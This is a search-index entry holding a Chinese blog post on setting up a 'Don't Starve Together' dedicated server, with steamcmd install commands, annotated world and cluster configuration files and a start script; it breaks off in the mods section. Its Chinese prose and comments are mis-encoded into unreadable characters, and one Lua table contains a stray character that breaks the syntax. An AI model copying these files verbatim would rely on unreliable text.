[{"title":"DSTè”æœºç‰ˆ æœåŠ¡å™¨æ­å»º","url":"/2022/12/16/DST_Server/","content":"\n# 0x00 å‰è¨€\n\nè¿‘æœŸå¤§ä»¶äº‹ï¼Œä¸‰å¹´çš„ç–«æƒ…ç®¡æ§ç»“æŸäº†ï¼Œå…¨å›½åŸºæœ¬æ”¾å¼€ï¼Œä¸ç”¨åšæ ¸é…¸ï¼Œç«è½¦é«˜é“å’Œå„ç§å…¬å…±åœºåˆä¹Ÿä¸ç”¨æŸ¥çœ‹å¥åº·ç å’Œè¡Œç¨‹ç äº†ï¼›åæ¶ˆæ¯æ˜¯ğŸğŸğŸğŸ˜¥ğŸğŸğŸ...\n\nèµ·å› æ˜¯å­¦æ ¡æå‰ä¸€ä¸ªæœˆæŠŠæˆ‘ä»¬èµ¶å›å®¶ï¼Œä½†åœ¨å®¶éš¾å…æœ‰äº›æ¸…é—²ï¼Œå¿½æ€ä¸å‹åŒæˆã€Šé¥¥è’ã€‹ï¼Œç„¶å¡é¡¿å¼‚å¸¸ï¼Œå¿æ— å¯å¿ï¼Œä¸å¾—å·²è‡ªæ­æœåŠ¡å™¨ä¸ä¹‹åŒä¹ã€‚~~é¡ºä¾¿æ°´ç¯‡åšå®¢~~\n\n# 0x01 åŸºç¡€æ­å»º\n\næˆ‘å¤ªæ‡’äº†ï¼Œsshä¸€ç›´çš„ç”¨rootç™»å½•ï¼Œå»ºè®®ä¸€å®šè¦ä½¿ç”¨érootç”¨æˆ·è¿æ¥ã€‚\n\nè¿™æ˜¯æˆ‘çš„æœåŠ¡å™¨é…ç½®ï¼Œ3-4ä¸ªäººæ„Ÿè§‰é—®é¢˜ä¸å¤§ã€‚\n\n![image-20221217184108264](https://files.catbox.moe/bbobla.png)\n\nå®‰è£…ä¸€äº›ä¾èµ–é¡¹ï¼Œå¿˜è®°äº†ï¼Œå¿…è¦æ—¶å¯ä»¥ç™¾åº¦ï¼Œæ¥ç€å®‰è£…steamcmdï¼Œå¹¶æ‰§è¡Œsteamcmd.sh\n\n```shell\nmkdir ~/steamcmd\ncd ~/steamcmd\nwget http://media.steampowered.com/installer/steamcmd_linux.tar.gz\ntar -xvzf steamcmd_linux.tar.gz\n\n./steamcmd.sh\nlogin anonymous\nforce_install_dir \"../myDSTserver/\" #ä¿®æ”¹DSTå®‰è£…è·¯å¾„\napp_update 343050 validate\nquit\n```\n\nå¯åŠ¨æ¸¸æˆï¼Œç‚¹å‡»è´¦å·ï¼Œç”¨æˆ·ä¿¡æ¯é‡Œè·å–ç”¨æˆ·IDï¼›æ¸¸æˆé‡Œè·å–æœåŠ¡å™¨token\n\n![image-20221217183345589](https://files.catbox.moe/zvjvgk.png)![image-20221217183540810](https://files.catbox.moe/dygskr.png)\n\nä¹‹åï¼Œå¯ä»¥ä½¿ç”¨æ—§å­˜æ¡£çš„æ–‡ä»¶ï¼Œæˆ–è€…ç‚¹å‡»é…ç½®æœåŠ¡å™¨ï¼Œæ–°å»ºä¸€ä¸ªæ–°çš„å­˜æ¡£æ–‡ä»¶å¤¹ã€‚ä¸¤ç§éƒ½å·®ä¸å¤šï¼Œæˆ‘å°±æŠŠæ—§çš„å­˜æ¡£ä¸Šä¼ åˆ°æœåŠ¡å™¨ä¸Šï¼Œè·¯å¾„æ˜¯`~/.klei/DoNotStarveTogether/Cluster_1/`ï¼Œç›®å½•ç»“æ„æ˜¯è¿™æ ·çš„\n\n```tex\nâ”œâ”€â”€ Cluster_1/\nâ”‚    â”œâ”€â”€ cluster.ini\nâ”‚    â”œâ”€â”€ cluster_token.txt\nâ”‚    â”œâ”€â”€ Caves/\nâ”‚    â”‚    â”œâ”€â”€ server.ini\nâ”‚    â”‚    â”œâ”€â”€ leveldataoverride.lua\nâ”‚    â”‚    â”œâ”€â”€ modoverrides.lua\nâ”‚    â”œâ”€â”€ Master/\nâ”‚    â”‚    â”œâ”€â”€ server.ini\nâ”‚    â”‚    â”œâ”€â”€ leveldataoverride.lua\nâ”‚    â”‚    â”œâ”€â”€ modoverrides.lua\n```\n\nè¿™æ˜¯ä¸€ä¸ªå®Œæ•´çš„ä½é¢æ‰€éœ€è¦é…ç½®çš„æ–‡ä»¶\n\n- `cluster_token.txt` å­˜å‚¨çš„æ˜¯ä» Klei å®˜ç½‘æ‹¿åˆ°çš„ token\n- `cluster.ini` å³è¿™ä¸ªä½é¢çš„ä¸»é…ç½®ï¼Œä¸»è¦é…ç½®æ¸¸æˆæ¨¡å¼ã€æ¸¸æˆäººæ•°ã€æœåŠ¡å™¨åã€å¯†ç ã€ steam ç»„ç­‰ç­‰\n- `Master/server.ini` ä¸ `Caves/server.ini` é…ç½®åŸºæœ¬ç›¸åŒï¼Œä¸»è¦æ˜¯ä¸–ç•Œçš„ç«¯å£å·å’Œä¸»æ¬¡ä¸–ç•Œè®¾ç½®\n- `modoverrides.lua` é…ç½®å¼€å¯çš„ mod çš„è®¾ç½®\n- `leveldataoverride.lua` é…ç½®è¿™ä¸ªä¸–ç•Œçš„èµ„æºã€è®¾ç½®\n\nå¦å¤–åœ¨å®‰è£…ç›®å½•ä¸­æœ‰ä¸ª mods çš„ç›®å½•ï¼Œå…¶ä¸­å¯ä»¥æ·»åŠ æœåŠ¡å™¨æ¨¡ç»„ï¼Œå½“ç„¶ä»…ä»…æ˜¯å®‰è£…åˆ°æœåŠ¡å™¨ä¸Šã€‚ç”¨ä¸ç”¨è¿˜æ˜¯éœ€è¦çœ‹ä¸–ç•Œä¸­ modoverrides.lua çš„è®¾ç½®ã€‚\n\nåœ°ä¸Šä¸–ç•Œ(æ´ç©´)åŸºç¡€é…ç½®æ–‡ä»¶ leveldataoverride.lua\n\n```lua\nreturn {\n  desc=\"The standard Don't Starve experience.\",\n  hideminimap=false,\n  id=\"SURVIVAL_TOGETHER\",\n  location=\"forest\",\n  max_playlist_position=999,\n  min_playlist_position=0,\n  name=\"Standard Forest\",\n  -- é›•åƒçš„æ•°é‡\n  numrandom_set_pieces=4,\n  override_level_string=false,\n  overrides={\n    -- èµ„æºè®¾ç½®çš„å¯é€‰é¡¹åˆ†åˆ«ä¸º:\n    ----- \"never\"    æ— \n    ----- \"rare\"     è¾ƒå°‘\n    ----- \"default\"  é»˜è®¤\n    ----- \"often\"    è¾ƒå¤š\n    ----- \"always\"   å¤§é‡\n\n    -- å…¨å±€è®¾ç½®\n    --- ç‰¹æ®Šäº‹ä»¶\n    ----- \"none\"                 æ— \n    ----- \"default\"              è‡ªåŠ¨\n    ----- \"crow_carnival\"        ç››å¤é¸¦å¹´å\n    ----- \"hallowed_nights\"      ä¸‡åœ£ä¹‹å¤œ\n    ----- \"winters_feast\"        å†¬å­£ç››å®´\n    ----- \"year_of_the_gobbler\"  ç«é¸¡ä¹‹å¹´\n    ----- \"year_of_the_varg\"     åº§ç‹¼ä¹‹å¹´\n    ----- \"year_of_the_pig\"      çŒªç‹ä¹‹å¹´\n    ----- \"year_of_the_carrat\"   èƒ¡èåœé¼ ä¹‹å¹´\n    ----- \"year_of_the_beefalo\"  çš®å¼—å¨„ç‰›ä¹‹å¹´\n    specialevent=\"default\",\n    --- å­£èŠ‚\n    ----- \"noseason\"         æ— å­£èŠ‚\n    ----- \"veryshortseason\"  éå¸¸çŸ­\n    ----- \"shortseason\"      è¾ƒçŸ­\n    ----- \"default\"          é»˜è®¤é•¿åº¦\n    ----- \"longseason\"       è¾ƒé•¿\n    ----- \"verylongseason\"   éå¸¸é•¿\n    ----- \"random\"           éšæœºé•¿åº¦\n    autumn=\"default\",  --- ç§‹å­£, æ ¹æ®è®¾ç½®å¤©æ•°ä¾æ¬¡ä¸º 5 / 12 / 20 / 30 / 50\n    winter=\"default\",  --- å†¬å­£, æ ¹æ®è®¾ç½®å¤©æ•°ä¾æ¬¡ä¸º 5 / 10 / 15 / 22 / 40\n    spring=\"default\",  --- æ˜¥å­£, æ ¹æ®è®¾ç½®å¤©æ•°ä¾æ¬¡ä¸º 5 / 12 / 20 / 30 / 50\n    summer=\"default\",  --- å¤å­£, æ ¹æ®è®¾ç½®å¤©æ•°ä¾æ¬¡ä¸º 5 / 10 / 15 / 22 / 40\n    --- å¤©ç±»å‹\n    ----- \"default\"    é»˜è®¤\n    ----- \"longday\"    åŠ é•¿ç™½å¤©\n    ----- \"longdusk\"   åŠ é•¿é»„æ˜\n    ----- \"longnight\"  åŠ é•¿é»‘å¤œ\n    ----- \"noday\"      æ— ç™½å¤©\n    ----- \"nodusk\"     æ— é»„æ˜\n    ----- \"nonight\"    æ— é»‘å¤œ\n    ----- \"onlyday\"    åªæœ‰ç™½å¤©\n    ----- \"onlydusk\"   åªæœ‰é»„æ˜\n    ----- \"onlynight\"  åªæœ‰é»‘å¤œ\n    day=\"default\",\n    beefaloheat=\"default\",  --- é‡ç‰›å‘æƒ…\n    krampus=\"default\",      --- åæ™®æ–¯\n\n    -- æ±‚ç”Ÿè€…è®¾ç½®\n    --- é¢å¤–èµ·å§‹èµ„æº\n    ----- \"0\"        æ€»æ˜¯\n    ----- \"5\"        5 å¤©å\n    ----- \"default\"  10 å¤©å\n    ----- \"15\"       15 å¤©å\n    ----- \"20\"       20 å¤©å\n    ----- \"none\"     ä»ä¸\n    extrastartingitems=\"default\",\n    seasonalstartingitems=\"default\",    --- å­£èŠ‚èµ·å§‹ç‰©å“, \"never\" / \"default\"\n    spawnprotection=\"default\",          --- å‡ºç”Ÿç‚¹ä¿æŠ¤, \"never\" / \"default\" / \"always\"\n    dropeverythingondespawn=\"default\",  --- é€€å‡ºæ‰è½ç‰©å“, \"default\" / \"always\"\n    brightmarecreatures=\"default\",      --- å¯è’™æ€ªå…½æ•°é‡\n    shadowcreatures=\"default\",          --- ç†æ™ºæ€ªå…½æ•°é‡\n\n    -- ä¸–ç•Œè®¾ç½®\n    --- çŸ³åŒ–\n    ----- \"none\"     æ— \n    ----- \"few\"      æ…¢\n    ----- \"default\"  é»˜è®¤\n    ----- \"many\"     å¿«\n    ----- \"max\"      æå¿«\n    petrification=\"default\",\n    frograin=\"default\",       --- è›™é›¨\n    hounds=\"default\",         --- çŒçŠ¬æ¥è¢­é¢‘ç‡\n    alternatehunt=\"default\",  --- è¿½çŒæƒŠå–œ\n    hunt=\"default\",           --- ç‹©çŒ\n    lightning=\"default\",      --- é—ªç”µ\n    meteorshowers=\"default\",  --- æµæ˜Ÿ\n    weather=\"default\",        --- é›¨\n    wildfires=\"default\",      --- é‡ç«\n\n    -- èµ„æºå†ç”Ÿçš„å¯é€‰é¡¹åˆ†åˆ«ä¸º:\n    ----- \"never\"     ä»ä¸\n    ----- \"veryslow\"  éå¸¸æ…¢\n    ----- \"slow\"      ç¼“æ…¢\n    ----- \"default\"   é»˜è®¤\n    ----- \"fast\"      å¿«é€Ÿ\n    ----- \"veryfast\"  éå¸¸å¿«\n\n    -- èµ„æºå†ç”Ÿè®¾ç½®\n    regrowth=\"default\",                --- å†ç”Ÿé€Ÿåº¦\n    deciduoustree_regrowth=\"default\",  --- æ¡¦æ —æ ‘å†ç”Ÿ\n    carrots_regrowth=\"default\",        --- èƒ¡èåœå†ç”Ÿ\n    evergreen_regrowth=\"default\",      --- å¸¸é’æ ‘å†ç”Ÿ\n    flowers_regrowth=\"default\",        --- èŠ±å†ç”Ÿ\n    moon_tree_regrowth=\"default\",      --- æœˆæ ‘å†ç”Ÿ\n    saltstack_regrowth=\"default\",      --- ç›çŸ¿å†ç”Ÿ\n    twiggytrees_regrowth=\"default\",    --- å¤šææ ‘å†ç”Ÿ\n\n    -- ç”Ÿç‰©è®¾ç½®\n    bees_setting=\"default\",      --- èœœèœ‚\n    birds=\"default\",             --- é¸Ÿ\n    bunnymen_setting=\"default\",  --- å…”äºº\n    butterfly=\"default\",         --- è´è¶\n    catcoons=\"default\",          --- æµ£çŒ«\n    gnarwail=\"default\",          --- ä¸€è§’é²¸\n    perd=\"default\",              --- ç«é¸¡\n    grassgekkos=\"default\",       --- è‰èœ¥èœ´\n    moles_setting=\"default\",     --- é¼¹é¼ \n    penguins=\"default\",          --- ä¼é¹…\n    pigs_setting=\"default\",      --- çŒªäºº\n    rabbits_setting=\"default\",   --- å…”å­\n    fishschools=\"default\",       --- é±¼ç¾¤\n    wobsters=\"default\",          --- é¾™è™¾\n\n    -- æ•Œå¯¹ç”Ÿç‰©è®¾ç½®\n    bats_setting=\"default\",     --- è™è \n    cookiecutters=\"default\",    --- é¥¼å¹²åˆ‡å‰²æœº\n    frogs=\"default\",            --- é’è›™\n    mutated_hounds=\"default\",   --- ææ€–çŒçŠ¬, \"never\" / \"default\"\n    hound_mounds=\"default\",     --- çŒçŠ¬\n    wasps=\"default\",            --- æ€äººèœ‚\n    lureplants=\"default\",       --- é£ŸäººèŠ±\n    walrus_setting=\"default\",   --- æµ·è±¡\n    merms=\"default\",            --- é±¼äºº\n    penguins_moon=\"default\",    --- æœˆçŸ³ä¼é¹…, \"never\" / \"default\"\n    mosquitos=\"default\",        --- èšŠå­\n    sharks=\"default\",           --- é²¨é±¼\n    moon_spider=\"default\",      --- ç ´ç¢èœ˜è››\n    squid=\"default\",            --- ä¹Œè´¼\n    spider_warriors=\"default\",  --- èœ˜è››æˆ˜å£«, \"never\" / \"default\"\n    spiders_setting=\"default\",  --- èœ˜è››\n\n    -- å·¨å‹ç”Ÿç‰©è®¾ç½®\n    antliontribute=\"default\",    --- èšç‹®\n    bearger=\"default\",           --- ç†Šç¾\n    beequeen=\"default\",          --- èœ‚å\n    crabking=\"default\",          --- å¸ç‹èŸ¹\n    deerclops=\"default\",         --- ç‹¬çœ¼å·¨é¹¿\n    dragonfly=\"default\",         --- é¾™è‡\n    eyeofterror=\"default\",       --- æ³°æ‹‰ç‘äºšä¹‹çœ¼\n    klaus=\"default\",             --- å…‹åŠ³æ–¯\n    fruitfly=\"default\",          --- æœè‡ç‹\n    malbatross=\"default\",        --- é‚ªå¤©ç¿\n    goosemoose=\"default\",        --- éº‹é¹¿é¹…\n    deciduousmonster=\"default\",  --- æ¯’æ¡¦æ —æ ‘\n    spiderqueen=\"default\",       --- èœ˜è››å¥³ç‹\n    liefs=\"default\",             --- æ ‘ç²¾å®ˆå«\n\n    -- ä¸–ç•Œç”Ÿæˆä¸­ç­‰çº§åˆ†åˆ«ä¸º:\n    ----- \"never\"      æ— \n    ----- \"uncommon\"   å¾ˆå°‘\n    ----- \"rare\"       è¾ƒå°‘\n    ----- \"default\"    é»˜è®¤\n    ----- \"often\"      è¾ƒå¤š\n    ----- \"mostly\"     å¾ˆå¤š\n    ----- \"always\"     å¤§é‡\n    ----- \"insane\"     ç–¯ç‹‚\n\n    -- å…¨å±€ç”Ÿæˆ\n    --- èµ·å§‹å­£èŠ‚\n    ----- \"default\"                      ç§‹\n    ----- \"winter\"                       å†¬\n    ----- \"spring\"                       æ˜¥\n    ----- \"summer\"                       å¤\n    ----- \"autumn|spring\"                ç§‹æˆ–æ˜¥\n    ----- \"winter|summer\"                å†¬æˆ–å¤\n    ----- \"autumn|winter|spring|summer\"  éšæœº\n    season_start=\"default\",\n\n    -- ä¸–ç•Œç”Ÿæˆ\n    --- ç”Ÿç‰©ç¾¤è½\n    ----- \"default\"  è”æœºç‰ˆ\n    ----- \"classic\"  ç»å…¸\n    task_set=\"default\",\n    --- å‡ºç”Ÿç‚¹\n    ----- \"plus\"      é¢å¤–èµ„æº\n    ----- \"darkness\"  é»‘æš—\n    ----- \"default\"   é»˜è®¤\n    start_location=\"default\",\n    world_size=\"default\",  --- ä¸–ç•Œå¤§å°, \"small\" / \"medium\" / \"default\" / \"huge\"\n    --- ä¸–ç•Œåˆ†æ”¯\n    ----- \"never\"    ä»ä¸\n    ----- \"least\"    å°‘\n    ----- \"default\"  é»˜è®¤\n    ----- \"most\"     å¤š\n    ----- \"random\"   éšæœº\n    branching=\"default\",\n    loop=\"default\",               --- ç¯å½¢ä¸–ç•Œ, \"never\" / \"default\" / \"always\"\n    touchstone=\"default\",         --- è¯•é‡‘çŸ³\n    boons=\"default\",              --- å‰è¾ˆ\n    prefabswaps_start=\"default\",  --- åˆå§‹èµ„æºå¤šæ ·åŒ–, \"classic\" / \"default\" / \"random\"\n    moon_fissure=\"default\",       --- å¤©ä½“è£‚éš™\n    terrariumchest=\"default\",     --- æ³°æ‹‰ç‘äºš, \"never\" / \"default\"\n    roads=\"default\",              --- é“è·¯, \"never\" / \"default\"\n    wormhole_prefab=\"wormhole\",   --- è™«æ´å¤šæ ·æ€§, \"wormhole\" (è™«æ´) / \"tentacle_pillar\" (å·¨å¤§è§¦æ‰‹)\n\n    -- èµ„æº\n    moon_starfish=\"default\",         --- æµ·æ˜Ÿ\n    moon_bullkelp=\"default\",         --- å…¬ç‰›æµ·å¸¦èŒ\n    berrybush=\"default\",             --- æµ†æœä»\n    rock=\"default\",                  --- å²©çŸ³\n    ocean_bullkelp=\"default\",        --- å…¬ç‰›æµ·å¸¦\n    cactus=\"default\",                --- ä»™äººæŒ\n    carrot=\"default\",                --- èƒ¡èåœ\n    flint=\"default\",                 --- ç‡§çŸ³\n    flowers=\"default\",               --- èŠ±\n    grass=\"default\",                 --- è‰\n    moon_hotspring=\"default\",        --- æ¸©æ³‰\n    moon_rock=\"default\",             --- æœˆäº®çŸ³\n    moon_sapling=\"default\",          --- æœˆäº®æ ‘è‹—\n    moon_tree=\"default\",             --- æœˆæ ‘\n    meteorspawner=\"default\",         --- æµæ˜ŸåŒº\n    rock_ice=\"default\",              --- è¿·ä½ å†°å·\n    mushroom=\"default\",              --- è˜‘è‡\n    ponds=\"default\",                 --- æ± å¡˜\n    reeds=\"default\",                 --- èŠ¦è‹‡\n    sapling=\"default\",               --- å°æ ‘è‹—\n    ocean_seastack=\"ocean_default\",  --- æµ·çŸ¿, å‚æ•°éœ€è¦åŠ  \"ocean_\" å‰ç¼€\n    marshbush=\"default\",             --- è†æ£˜æ ‘æ\n    moon_berrybush=\"default\",        --- çŸ³æœæ ‘\n    trees=\"default\",                 --- æ ‘ (æ‰€æœ‰)\n    tumbleweed=\"default\",            --- é£æ»šè‰\n\n    -- ç”Ÿç‰©åŠåˆ·æ–°ç‚¹\n    bees=\"default\",               --- èœ‚å·¢\n    beefalo=\"default\",            --- çš®å¼—å¨„ç‰›\n    buzzard=\"default\",            --- ç§ƒé¸ \n    moon_carrot=\"default\",        --- èƒ¡èåœé¼ \n    catcoon=\"default\",            --- çŒ«æ¡©\n    moles=\"default\",              --- é¼¹é¼ æ´\n    pigs=\"default\",               --- çŒªäººæˆ¿\n    rabbits=\"default\",            --- å…”å­æ´\n    moon_fruitdragon=\"default\",   --- æ²™æ‹‰è¾èˆ\n    ocean_shoal=\"default\",        --- é±¼ç¾¤\n    lightninggoat=\"default\",      --- ä¼ç‰¹ç¾Š\n    ocean_wobsterden=\"default\",   --- é¾™è™¾çª\n\n    -- æ•Œå¯¹ç”Ÿç‰©åŠåˆ·æ–°ç‚¹\n    chess=\"default\",                   --- å‘æ¡è£…ç½®\n    houndmound=\"default\",              --- çŒçŠ¬å†¢\n    angrybees=\"default\",               --- æ€äººèœ‚å·¢\n    merm=\"default\",                    --- æ¼é›¨çš„å°å±‹\n    walrus=\"default\",                  --- æµ·è±¡è¥åœ°\n    ocean_waterplant=\"ocean_default\",  --- æµ·è‰\n    moon_spiders=\"default\",            --- ç ´ç¢èœ˜è››æ´\n    spiders=\"default\",                 --- èœ˜è››å·¢\n    tallbirds=\"default\",               --- é«˜è„šé¸Ÿå·¢\n    tentacles=\"default\",               --- è§¦æ‰‹\n\n    --- Other\n    has_ocean=true,\n    keep_disconnected_tiles=true,\n    layout_mode=\"LinkNodesByKeys\",\n    no_joining_islands=true,\n    no_wormholes_to_disconnected_tiles=true\n  },\n  random_set_pieces={r\n    \"Sculptures_2\",\n    \"Sculptures_3\",\n    \"Sculptures_4\",\n    \"Sculptures_5\",\n    \"Chessy_1\",      -- 2å‘æ¡éª‘å£«ï¼Œ2é½¿è½®ï¼Œé•¿çŸ›ï¼Œæ£‹ç›˜åœ°çš®\n    \"Chessy_2\",      -- 2å‘æ¡ä¸»æ•™ï¼Œæ£‹ç›˜ã€ç‰›æ¯›åœ°çš®ï¼ŒMaxwell é›•åƒï¼Œ(2é½¿è½®)\n    \"Chessy_3\",      -- å‘æ¡æˆ˜è½¦ï¼Œèœ‚èœœè¯è†ï¼ŒèƒŒåŒ…ï¼Œæ£‹ç›˜ã€ç‰›æ¯›åœ°çš®\n    \"Chessy_4\",      -- å‘æ¡æˆ˜è½¦ï¼Œ2å¤§ç†çŸ³ï¼Œé¹¤å˜´é”„ï¼Œ2å¤§ç†çŸ³æŸ±ï¼Œ1å¤§ç†çŸ³æ ‘ï¼Œæ£‹ç›˜ã€ç‰›æ¯›åœ°çš®ï¼ŒMaxwell é›•åƒ\n    \"Chessy_5\",      -- 1å‘æ¡éª‘å£«ï¼Œ1å‘æ¡ä¸»æ•™ï¼Œç«–ç´é›•åƒï¼Œæ£‹ç›˜ã€ç‰›æ¯›åœ°çš®\n    \"Chessy_6\",      -- 1å‘æ¡éª‘å£«ï¼Œ1å‘æ¡ä¸»æ•™ï¼Œæ£‹ç›˜ã€ç‰›æ¯›åœ°çš®\n    \"Maxwell1\",      -- 1å‘æ¡æˆ˜è½¦ï¼Œ3å‘æ¡éª‘å£«ï¼Œæ£‹ç›˜ã€ç‰›æ¯›åœ°çš®ï¼Œ4å¤§ç†çŸ³æŸ±ï¼Œ9å¤§ç†çŸ³æ ‘ï¼Œå¤§é‡æ¶é­”èŠ±\n    \"Maxwell2\",      -- 1å‘æ¡æˆ˜è½¦ï¼Œ4å‘æ¡éª‘å£«ï¼Œæ£‹ç›˜ã€ç‰›æ¯›åœ°çš®ï¼Œ8å¤§ç†çŸ³æ ‘ï¼ŒMaxwell é›•åƒ\n    \"Maxwell3\",      -- 5å‘æ¡éª‘å£«ï¼Œæ£‹ç›˜ã€ç‰›æ¯›åœ°çš®ï¼ŒMaxwell é›•åƒ\n    \"Maxwell4\",      -- æ£‹ç›˜ã€ç‰›æ¯›åœ°çš®ï¼Œ8å¤§ç†çŸ³æ ‘ï¼ŒMaxwell é›•åƒ\n    \"Maxwell5\",      -- 1å‘æ¡éª‘å£«ï¼Œç‰›æ¯›åœ°çš®ï¼Œ8ç«–ç´é›•åƒï¼ŒMaxwell é›•åƒï¼Œå°‘é‡æ¶é­”èŠ±\n    \"Maxwell6\",      -- 5å¤§ç†çŸ³æ ‘ï¼Œç‰›æ¯›åœ°çš®\n    \"Maxwell7\",      -- 2å‘æ¡éª‘å£«ï¼Œæ£‹ç›˜ã€ç‰›æ¯›åœ°çš®ï¼Œ4å¤§ç†çŸ³æ ‘ï¼ŒMaxwell é›•åƒï¼Œå°‘é‡æ¶é­”èŠ±\n    \"Warzone_1\",\n    \"Warzone_2\",\n    \"Warzone_3\"\n  },\n  required_prefabs={ \"multiplayer_portal\" },\n  -- å¿…é¡»åŒ…å«çš„é›•åƒç§ç±»ï¼Œè€Œééšæœºç”Ÿæˆã€‚è¿™é‡ŒæŒ‡å®šå¿…é¡»ç”Ÿæˆå®Œæ•´çš„ä¸‰æ£‹å­é›•åƒ\n  required_setpieces={ \"Sculptures_1\" },\n  settings_desc=\"The standard Don't Starve experience.\",\n  settings_id=\"SURVIVAL_TOGETHER\",\n  settings_name=\"Standard Forest\",\n  substitutes={  },\n  version=4,\n  worldgen_desc=\"The standard Don't Starve experience.\",\n  worldgen_id=\"SURVIVAL_TOGETHER\",\n  worldgen_name=\"Standard Forest\"\n}\n\n```\n\næ ¹ç›®å½•ä¸‹çš„`cluster.ini`\n\n```python\n[GAMEPLAY]\nmax_players = 6                    # æœ€å¤§æ¸¸æˆäººæ•°\npvp = true                         # èƒ½ä¸èƒ½æ”»å‡»å…¶ä»–ç©å®¶ï¼Œèƒ½ä¸èƒ½ç»™å…¶ä»–ç©å®¶å–‚å±\ngame_mode = survival               # æ¸¸æˆæ¨¡å¼ï¼Œå¯é€‰ survival, endless or wildernessï¼Œä¸ç©å®¶æ­»äº¡åçš„è´Ÿé¢å½±å“æœ‰å…³\npause_when_empty = false           # æ²¡äººæœåŠ¡å™¨æš‚åœï¼Œåˆ·å¤©æ•°å¿…å¤‡\nvote_kick_enabled = false          # æŠ•ç¥¨è¸¢äºº\n\n[STEAM]\nsteam_group_only = false           # åªå…è®¸æŸ Steam ç»„çš„æˆå‘˜åŠ å…¥\nsteam_group_id = 0                 # æŒ‡å®šæŸä¸ª Steam ç»„ï¼Œå¡«å†™ç»„ ID\nsteam_group_admins = false         # å¼€å¯åï¼ŒSteam ç»„çš„ç®¡ç†å‘˜æ‹¥æœ‰æœåŠ¡å™¨çš„ç®¡ç†æƒé™\n\n[NETWORK]\ncluster_description = ~            # æ¸¸æˆæˆ¿é—´æè¿°\ncluster_name = ~                   # æ¸¸æˆæˆ¿é—´åç§°\ncluster_intention = social         # æ¸¸æˆåå¥½ï¼Œå¯é€‰ cooperative, competitive, social,  madness\ncluster_password =                 # æ¸¸æˆå¯†ç ï¼Œä¸è®¾ç½®è¡¨ç¤ºæ— å¯†ç \noffline_server = false             # æ˜¯å¦ç¦»çº¿æœåŠ¡å™¨ï¼Œåªæœ‰å±€åŸŸç½‘ç”¨æˆ·èƒ½åŠ å…¥ï¼Œå¹¶ä¸”æ‰€æœ‰ä¾èµ–äº Steam çš„ä»»ä½•åŠŸèƒ½éƒ½æ— æ•ˆï¼Œæ¯”å¦‚è¯´é¥°å“æ‰è½\ntick_rate = 15                     # æ¯ç§’é€šä¿¡æ¬¡æ•°ï¼Œè¶Šé«˜æ¸¸æˆä½“éªŒè¶Šå¥½ï¼Œä½†æ˜¯ä¼šåŠ å¤§æœåŠ¡å™¨è´Ÿæ‹…\nwhitelist_slots = 0                # ä¸ºç™½åå•ç”¨æˆ·ä¿ç•™çš„æ¸¸æˆä½\nlan_only_cluster = false           # å±€åŸŸç½‘æ¸¸æˆ\n\n[MISC]\nconsole_enabled = true             # æ˜¯å¦å¼€å¯æ§åˆ¶å°\nmax_snapshots = 6                  # æœ€å¤§å¿«ç…§æ•°ï¼Œå†³å®šäº†å¯å›æ»šçš„å¤©æ•°\n\n[SHARD]\nshard_enabled = true               # æ˜¯å¦å…è®¸åœ°ä¸ŠåŠæ´ç©´äº’é€šï¼Œå¼€å¯æ´ç©´çš„è¯å¿…é¡»å¡«true\nbind_ip = 127.0.0.1                # æœåŠ¡å™¨ç›‘å¬çš„åœ°å€ï¼Œå•æœåŠ¡å™¨æ­å»ºå¡« 127.0.0.1ï¼ŒåŒæœåŠ¡å™¨æ­å»ºå¡«0.0.0.0\nmaster_ip = 127.0.0.1              # ä¸»ä¸–ç•ŒæœåŠ¡å™¨çš„ IPï¼Œå•æœåŠ¡å™¨æ­å»ºå¡«127.0.0.1ï¼ŒåŒæœåŠ¡å™¨æ­å»ºå¡«å†™æœåŠ¡å™¨çš„å…¬ç½‘IP\nmaster_port = 10889                # ç›‘å¬ master æœåŠ¡å™¨çš„ UDP ç«¯å£\ncluster_key = supersecretkey       # æ¸¸æˆé€šè®¯å¯†ç ï¼Œæ¯å°æœåŠ¡å™¨å¿…é¡»ç›¸åŒ\n```\n\nåœ°ä¸Š(æ´ç©´)çš„server.ini\n\n```python\n[NETWORK]\nserver_port = 11000                # ç›‘å¬çš„ UDP ç«¯å£ï¼Œåªèƒ½ä»‹äº 10998 - 11018 ä¹‹é—´ï¼Œç¡®ä¿æ¯ä¸ªå®ä¾‹éƒ½ä¸ç›¸åŒ\n\n[SHARD]\nis_master = true                  # æ˜¯å¦æ˜¯ master æœåŠ¡å™¨ï¼Œåªèƒ½å­˜åœ¨ä¸€ä¸ª trueï¼Œå…¶ä»–å…¨æ˜¯ false\n\n[STEAM]\nmaster_server_port = 27018        # Steam ç”¨çš„ç«¯å£ï¼Œç¡®ä¿æ¯ä¸ªå®ä¾‹éƒ½ä¸ç›¸åŒ\nauthentication_port = 8768        # Steam ç”¨çš„ç«¯å£ï¼Œç¡®ä¿æ¯ä¸ªå®ä¾‹éƒ½ä¸ç›¸åŒ\n\n[ACCOUNT]\nencode_user_path = true\n```\n\nè¿™äº›é…ç½®æ–‡ä»¶å¯æ ¹æ®è‡ªå·±çš„éœ€æ±‚è®¾ç½®ã€‚æœ€åæ‰§è¡Œè„šæœ¬å¯åŠ¨æœåŠ¡å³å¯ã€‚\n\n```shell\n#!/bin/sh\ncd ~/myDSTserver/bin\nscreen -S \"Don't Starve Together Server\" ./dontstarve_dedicated_server_nullrenderer\n```\n\nctrl a ,ctrl dåå°è¿è¡Œï¼Œscreen -r æ¢å¤\n\n# 0x02 æ·»åŠ æœåŠ¡å™¨mod\n\næ— modï¼Œä¸é¥¥è’ã€‚åœ¨æœ¬åœ°ç›®å½•å¯ä»¥æ‰¾åˆ°è‡ªå·±çš„æ¨¡ç»„ï¼Œå¯ä»¥å…ˆåˆ›å»ºä¸–ç•Œåï¼Œå¯¼å‡ºé…ç½®æ–‡ä»¶å¹¶ä¸Šä¼ åˆ°æœåŠ¡å™¨ã€‚è¿™é‡Œå°±ä¸æ”¾äº†ï¼Œè¿˜æœ‰æ›´ç®€å•çš„æ–¹æ³•ï¼Œåœ¨æœåŠ¡å™¨çš„DSTçš„modsç›®å½•ä¸‹ï¼Œæœ‰ä¸ªdedicated\\_server\\_mods\\_setup.luaæ–‡ä»¶ï¼Œåœ¨é‡Œé¢å†™å…¥æƒ³è¦æ›´æ–°çš„modå³å¯ï¼Œå¾ˆæ–¹ä¾¿ã€‚ä¸‹è½½å¹¶å®‰è£…è¿™äº› 